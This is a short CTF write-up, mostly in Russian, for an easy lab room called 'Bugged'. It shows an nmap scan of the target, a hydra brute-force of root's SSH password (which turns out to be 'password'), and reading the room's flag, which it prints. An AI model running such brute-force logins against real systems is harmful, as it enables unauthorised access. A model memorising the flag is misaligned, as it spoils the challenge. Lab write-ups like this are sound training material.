# Writeup: Bugged

> John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?

Для начала проверим, какие порты открыты с помощью nmap:
```sh
nmap -sS -sV -p- 10.113.164.244
```
```sh
Starting Nmap 7.991SVN ( https://nmap.org )
Nmap scan report for 10.113.164.244
Host is up (0.0054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE                  VERSION
22/tcp   open  ssh                      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
1883/tcp open  mosquitto version 2.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds
```
Судя по репорту nmap, открыто 2 порта:
- 22 - ssh
- 1883 - app

> Eclipse Mosquitto — это брокер сообщений с открытым исходным кодом (лицензии EPL/EDL), который Реализует протокол MQTT версий 5.0, 3.1.1 и 3.1. Mosquitto Он легкий и подходит для использования на всех устройствах, начиная с самых простых. от одноплатных компьютеров до полноценных серверов.   

В действительности, я потратил много времени что бы разобраться с mosquitto. В этой версии (2.0.14) есть уязвимость, связанная с утечкой памяти. Но не смог найти на нее эксплоита. Так как это CTF уровня Easy, логично предположить, что че-то сверхсложного тут не попросят делать. По этой причине решил попробовать брутить пароль на ssh, и как же я был удивлен, что пароль оказался таким простым :)
```sh
hydra -l root -P /tmp/pass.txt ssh://10.113.164.244
Hydra v9.8dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-16 21:30:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.113.164.244:22/
[22][ssh] host: 10.113.164.244   misc: (null)   login: root   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-16 21:31:00
```
Мы получили доступ root и сразу же флаг...
```sh
root@ip-10-113-164-244:~# ls bugged/
```
```sh
client  docker-compose.yml  flag.txt  mosquitto
```
```sh
root@ip-10-113-164-244:~# cat bugged/flag.txt
```
```sh
flag{18d44fc0707ac8dc8be45bb83db54013}
```
